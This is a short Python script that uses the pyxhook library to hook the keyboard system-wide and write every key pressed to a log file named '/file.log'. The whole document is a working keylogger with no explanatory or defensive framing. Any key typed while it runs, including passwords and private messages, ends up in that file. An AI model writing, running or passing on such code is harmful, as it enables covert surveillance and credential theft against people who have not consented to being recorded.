import pyxhook

#file log path
log_file='/file.log'


#writing in file
def OnKeyPress(event):
	with open(log_file,'a') as file:
		file.write(event.Key)
		file.write('\n')


hook=pyxhook.HookManager()

#start listening
hook.KeyDown=OnKeyPress

#keyboard hook
hook.HookKeyboard()

hook.start()
